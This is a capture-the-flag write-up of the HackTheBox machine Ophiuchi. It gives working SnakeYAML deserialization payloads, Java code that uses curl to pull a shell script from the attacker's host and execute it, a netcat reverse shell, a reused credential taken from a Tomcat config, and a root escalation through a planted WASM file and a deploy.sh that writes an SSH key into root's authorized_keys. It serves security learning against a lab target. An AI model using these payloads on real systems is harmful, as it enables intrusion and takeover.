---
title: HTB: Ophiuchi
url: https://0xdf.gitlab.io/2021/07/03/htb-ophiuchi.html
date: 2021-07-03T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-ophiuchi, hackthebox, ctf, nmap, ubuntu, yaml, tomcat, java, jar, deserialization, gobuster, marshalsec, yaml-payload, wasm, wasm-fiddle, webassembly, htb-ropetwo, oscp-like-v2
---

![Ophiuchi](https://0xdfimages.gitlab.io/img/ophiuchi-cover.png)

Ophiuchi presented two interesting attacks. First there was a Java YAML deserialization attack that involved generating a JAR payload to inject via a serialized payload. Then there was a somewhat contrived challenge that forced me to generate web assembly (or WASM) code to get execution of a Bash script.

## Box Info

| Name | [Ophiuchi](https://hackthebox.com/machines/ophiuchi)  [Ophiuchi](https://hackthebox.com/machines/ophiuchi) [Play on HackTheBox](https://hackthebox.com/machines/ophiuchi) |
| --- | --- |
| Release Date | [13 Feb 2021](https://twitter.com/hackthebox_eu/status/1359849925945810947) |
| Retire Date | 03 Jul 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Ophiuchi |
| Radar Graph | Radar chart for Ophiuchi |
| First Blood User | 00:23:58[Mtib Mtib](https://app.hackthebox.com/users/315960) |
| First Blood Root | 00:57:11[kolokokop kolokokop](https://app.hackthebox.com/users/91278) |
| Creator | [felamos felamos](https://app.hackthebox.com/users/27390) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (8080):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.227
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-14 13:22 EST
Nmap scan report for 10.10.10.227
Host is up (0.11s latency).
Not shown: 58706 closed ports, 6827 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
oxdf@parrot$ nmap -p 22,8080 -sCV -oA scans/nmap-tcpscripts 10.10.10.227
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-14 13:22 EST
Nmap scan report for 10.10.10.227
Host is up (0.082s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.39 second

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal. The server is Tomcat, so I can expect a Java-based site.

### Website - TCP 8080

#### Site

The page is an online YAML parser:

![image-20210206132436756](https://0xdfimages.gitlab.io/img/image-20210206132436756.png)

The need support link just leads back to this page.

Adding any text and clicking parse leads to an error message:

> Due to security reason this feature has been temporarily on hold. We will soon fix the issue!

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ gobuster dir -u http://10.10.10[9/9$
8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster
-root-small -t 40                         
===============================================================
Gobuster v3.0.1                                                                      
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.227:8080
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1                                                   
[+] Timeout:        10s                                                              ===============================================================                      2021/02/14 13:54:52 Starting gobuster                                                
===============================================================
/test (Status: 302)
/manager (Status: 302)                                                               
===============================================================
2021/02/14 13:57:58 Finished                                                         
===============================================================

```

`/manager` is the Tomcat manager page, which needs creds, and the defaults don’t work.

`/test` redirects to `/test/` which is 404.

## Shell as tomcat

### Deserialization POC

YAML parsers are notoriously bad with safely handling data serialized data. Thinking about what the site is (or will be?) doing with input, it will try to parse the YAML into objects, which is deserialization.

Despite the site saying it’s down, it’s not clear if that is displayed before or after trying to deserialize the user input. I’ll try a YAML derserialization payload just to check. Since the server is Tomcat, I’ll look for Java-based payloads. In Googling “Java YAML deserialization”, there are a handful of blog posts about the topic. [This post](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858) has a nice test to see if Java Yaml deserialization would work, which when adapted for Ophiuchi becomes:

```

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.7/"]
  ]]
]

```

I’ll start a Python webserver and put that into the form. On submitting, there’s a request:

```

oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.227 - - [14/Feb/2021 16:33:34] code 404, message File not found
10.10.10.227 - - [14/Feb/2021 16:33:34] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -

```

This means the POC worked.

### RCE POC

The blog post now writes some Java code which it compiles into a `.class` file, and generates a folder structure for this request. I had a bit of a struggle getting that to work. I created the `/META-INF/services/javax.script.ScriptEngineFactory` file and the compiled Class file. Ophiuchi would read that and then request the class file, but then it would crash the page and not show any evidence of executing my code.

Some Googling led to [this marshalsec repo](https://github.com/mbechler/marshalsec) for all kinds of Java-based deserialization attacks, and then the [yaml-payload](https://github.com/artsploit/yaml-payload) repo, which focuses on this specific SnakeYAML deserialization attack. The payload looks exactly the same, but they put it into a JAR for loading. The YAML part now tries to load a JAR file instead of a URL path:

```

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]

```

Sending that now just requests the single file, and not the `META-INF` path:

```
10.10.10.227 - - [15/Feb/2021 06:52:56] code 404, message File not found
10.10.10.227 - - [15/Feb/2021 06:52:56] "GET /yaml-payload.jar HTTP/1.1" 404 -

```

I’ll clone the [yaml-payload repo](https://github.com/artsploit/yaml-payload) to my VM and copy the `src` folder into my folder for this box:

```

oxdf@parrot$ cp -r src/ ~/hackthebox/ophiuchi-10.10.10.227/

```

I’ll change to `src/artsploit/AwesomeScriptEngineFactory` file to include a `ping` to my VM:

```

 10     public AwesomeScriptEngineFactory() {
 11         try {
 12             Runtime.getRuntime().exec("ping -c 1 10.10.14.7");
 13         } catch (IOException e) {
 14             e.printStackTrace();
 15         }
 16     }

```

Now compile that code, and then put it into a JAR:

```

oxdf@parrot$ javac src/artsploit/AwesomeScriptEngineFactory.java 
oxdf@parrot$ jar -cvf ping.jar -C src/ .
added manifest
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1607) (out= 668)(deflated 58%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1480) (out= 392)(deflated 73%)
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)

```

The resulting JAR file has a similar structure as was being requested across multiple requests in the first attempt:

```

oxdf@parrot$ jar -tf ping.jar 
META-INF/
META-INF/MANIFEST.MF
artsploit/
artsploit/AwesomeScriptEngineFactory.class
artsploit/AwesomeScriptEngineFactory.java
META-INF/services/
META-INF/services/javax.script.ScriptEngineFactory
oxdf@parrot$ cat src/META-INF/services/javax.script.ScriptEngineFactory 
artsploit.AwesomeScriptEngineFactory

```

I’ll move `ping.jar` into my directory hosted by the Python webserver, and send the payload:

```

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.7/ping.jar"]
  ]]
]

```

First it’s requested from the HTTP server (twice for some reason):

```
10.10.10.227 - - [15/Feb/2021 07:16:58] "GET /ping.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 07:16:58] "GET /ping.jar HTTP/1.1" 200 -

```

Then it pings my VM:

```

oxdf@parrot$ sudo tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:16:58.677743 IP 10.10.10.227 > 10.10.14.7: ICMP echo request, id 3, seq 1, length 64
07:16:58.677755 IP 10.10.14.7 > 10.10.10.227: ICMP echo reply, id 3, seq 1, length 64

```

That’s RCE.

### Rev Shell

Getting a reverse shell from here wasn’t trivial. I think this is typically of Java. I tried several Java reverse shells, and putting typical Bash and `nc` based shells into the `Runtime.getRuntime().exec()`. Nothing worked.

Stepping back, I tried just putting `nc 10.10.14.7 443` into `Runtime.getRuntime().exec()`, and it connected back. So it isn’t a firewall, but rather something about how Java is running the reverse shells. What about `curl`? I’ll modify the Java source to issues `curl http://10.10.14.7`, recompile / re-Jar, and trigger, and it works:

```
10.10.10.227 - - [15/Feb/2021 07:34:28] "GET /rev.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 07:34:28] "GET /rev.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 07:34:29] "GET / HTTP/1.1" 200 -

```

I’ve run into this before. Java has issues when you include pipes or redirects in the execution payloads. The best way around this is to do it in steps:
1. Use `curl` or `wget` to upload a Bash script that provides a ReverseShell.
2. `chmod` that script `+x`.
3. Call the script.

This can be done in one JAR payload:

```

 10     public AwesomeScriptEngineFactory() throws InterruptedException {
 11         try {
 12             Process p = Runtime.getRuntime().exec("curl http://10.10.14.7/shell.sh -o /dev/shm/.s.sh");
 13             p.waitFor();
 14             p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
 15             p.waitFor();
 16             p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
 17         } catch (IOException e) {
 18             e.printStackTrace();
 19         }
 20     }

```

I’ll compile, Jar, and move it into `www`:

```

oxdf@parrot$ javac src/artsploit/AwesomeScriptEngineFactory.java
oxdf@parrot$ jar -cvf rev.jar -C src/ .
added manifest
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1837) (out= 784)(deflated 57%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1730) (out= 462)(deflated 73%)
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
oxdf@parrot$ mv rev.jar www/

```

The payload is:

```

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.7/rev.jar"]
  ]]
]

```

There’s three requests at the Python HTTP server, two for the Jar, and then for the shell:

```
10.10.10.227 - - [15/Feb/2021 09:19:52] "GET /rev.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 09:19:52] "GET /rev.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 09:19:52] "GET /shell.sh HTTP/1.1" 200 -

```

Then there’s a shell at listening `nc`:

```

oxdf@parrot$ sudo nc -lnvp 443                  
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.227] 37728
bash: cannot set terminal process group (730): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ophiuchi:/$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

```

I’ll upgrade my shell with the standard Python trick:

```

tomcat@ophiuchi:/$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
tomcat@ophiuchi:/$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@ophiuchi:/$ 

```

## Shell as admin

There’s one real user on the box, admin, and their home directory has `user.txt`, but I can’t read it as tomcat:

```

tomcat@ophiuchi:/home/admin$ ls -la
total 32
drwxr-xr-x 4 admin admin 4096 Jan  7 09:18 .
drwxr-xr-x 3 root  root  4096 Dec 28 00:18 ..
lrwxrwxrwx 1 root  root     9 Dec 28 00:51 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 Dec 28 00:18 .bash_logout
-rw-r--r-- 1 admin admin 3771 Dec 28 00:18 .bashrc
drwx------ 2 admin admin 4096 Dec 28 00:35 .cache
drwx------ 4 admin admin 4096 Jan  6 08:31 .gnupg
-rw-r--r-- 1 admin admin  807 Dec 28 00:18 .profile
-rw-r--r-- 1 admin admin    0 Jan  7 09:18 .sudo_as_admin_successful
-r-------- 1 admin admin   33 Oct 14 19:56 user.txt
lrwxrwxrwx 1 root  root     9 Jan  7 09:11 .viminfo -> /dev/null

```

As the tomcat user, the current home directory is `/opt/tomcat`:

```

tomcat@ophiuchi:~$ pwd
/opt/tomcat

```

`/opt/tomcat/conf/tomcat-users.xml` has the username and password for Tomcat:

```

<?xml version="1.0" encoding="UTF-8"?>
...[snip]...
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
        version="1.0">
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
...[snip]...

```

The username here matches the username from the host. I’ll see if the password is reused. It is:

```

tomcat@ophiuchi:~$ su admin -
Password: 
admin@ophiuchi:/opt/tomcat$

```

I can also connect over SSH:

```

oxdf@parrot$ sshpass -p "whythereisalimit" ssh admin@10.10.10.227                                                                       ...[snip]...
admin@ophiuchi:~$

```

And grab `user.txt`:

```

admin@ophiuchi:~$ cat user.txt
0b6d65ef************************

```

## Shell as root

### Enumeration

#### sudo

`sudo -l` shows that admin can run a specific Go program as root:

```

admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go

```

#### wasm-functions

The `index.go` program reads in `main.wasm` and uses it to create a new `wasm` instance:

```

admin@ophiuchi:/opt/wasm-functions$ cat index.go 
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)

func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}

```

Then it runs a function, `info` from that instance and checks the result. If the return is not 1, then it prints “Not ready to deploy”. Otherwise, it prints “Ready to deploy” and runs `deploy.sh`, which is empty at this point:

```

#!/bin/bash

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080

```

If I try to run this from `/home/admin`, it returns a bunch of errors:

```

admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
panic: runtime error: index out of range [0] with length 0

goroutine 1 [running]:
github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports.func1(0x0, 0x0, 0xc000040c90, 0x5d1200, 0x200000003)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:94 +0x201
github.com/wasmerio/wasmer-go/wasmer.newInstanceWithImports(0xc000086020, 0xc000040d48, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc000040d70)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:137 +0x1d3
github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports(0x0, 0x0, 0x0, 0xc000086020, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, ...)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:87 +0xa6
github.com/wasmerio/wasmer-go/wasmer.NewInstance(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, 0x1)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:82 +0xc9
main.main()
        /opt/wasm-functions/index.go:14 +0x6d
exit status 2

```

These error messages are not great, but it’s because it’s trying to read `main.wasm` from the current directory, and failing because it’s not there. If I go into the directory where the files are, it runs fine:

```

admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy

```

### Reverse main.wasm

Based on the output above, `main.wasm` is clearly returning a non-1 value, so it’s time to look at that.

WASM, or [Web Assembly](https://webassembly.org/), is a binary instruction format for a stack-based virtual machine designed to run cross-platform. The main purpose for WASM is to have fast and high performance applications on webpages, but it can run in other environments as well.

I’ll copy `main.wasm` back to my VM using `scp`:

```

oxdf@parrot$ sshpass -p whythereisalimit scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
oxdf@parrot$ file main.wasm 
main.wasm: WebAssembly (wasm) binary module version 0x1 (MVP)

```

Googling for WASM disassembler, the first result is [The WebAssembly Binary Toolkit, or WABT](https://github.com/WebAssembly/wabt). I’ll build the tools by cloning the repo to my machine, and then running the `make` script:

```

oxdf@parrot$ git clone --recursive https://github.com/WebAssembly/wabt
Cloning into 'wabt'...
...[snip]...
oxdf@parrot$ cd wabt/
oxdf@parrot$ make
mkdir -p out/clang/Debug/
...[snip]...

```

This will require `cmake` (`apt install cmake`) to run. Now I have different binaries to read the WebAssembly. `wasm2wat` will convert `main.wasm` into WebAssembly text format (from the binary format):

```

oxdf@parrot$ /opt/wabt/bin/wasm2wat main.wasm
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))  

```

That wasn’t totally clear to me. `wasm-decompile` was much cleaner:

```

oxdf@parrot$ /opt/wabt/bin/wasm-decompile main.wasm                                                                                        
export memory memory(initial: 16, max: 0);

global g_a:int = 1048576;
export global data_end:int = 1048576;
export global heap_base:int = 1048576;

table T_a:funcref(min: 1, max: 1);

export function info():int {
  return 0
}

```

The function `info` returns 0.

### Exploit

#### Strategy

Because the Go program isn’t using absolute paths, I can control both `main.wasm` and `deploy.sh`. I’ll write a `main.wasm` that returns 1, and a `deploy.sh` that gives a shell.

#### wasm

I recently looked at WASM for [RopeTwo](/2021/01/16/htb-ropetwo.html#create-rwx-segment), where my V8 payload used WASM to create a binary space in memory that was executable. That payload was just a silly function that returned 42, and then I overwrite that memory with my shellcode and call it. That didn’t require much WASM knowledge or even understanding, but I did learn about [WasmFidle](https://wasdk.github.io/WasmFiddle/). It allows me to put in some simple C code and generate Wasm.

[![image-20210207134325508](https://0xdfimages.gitlab.io/img/image-20210207134325508.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210207134325508.png)

In fact, the default code (which just returns 42) will solve my issue here. I’ll hit the “Build” button to generate the Wasm (shown on the bottom left). Now I can run it and it will print 42 (bottom right).

I’ll change the name of the function from `main` to `info`, change 42 to 1, and then Build again. If I want to run it, I need to change the call in the JS on the top right, but I don’t need to run it. There are two download buttons. “Wat” is the text version, and “Wasm” is the binary. I’ll take the binary.

#### Setup

I’ll copy the new Wasm into `/dev/shm`:

```

oxdf@parrot$ sshpass -p whythereisalimit scp program.wasm admin@10.10.10.227:/dev/shm

```

I’ll also create `deploy.sh` that will create a `.ssh` directory for the root user if it doesn’t exist, and then write my public SSH key into `authorized_keys`:

```

#!/bin/bash

echo "[*] Adding public key to /root/.ssh/authorized_keys"
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys
echo "[+] Done."

```

#### SSH Access

Now I’ll run it:

```

admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
[*] Adding public key to /root/.ssh/authorized_keys
[+] Done.

```

Now I can connect as root:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.227
...[snip]...
root@ophiuchi:~#

```

And grab the flag:

```

root@ophiuchi:~# cat root.txt
bdd26a85************************

```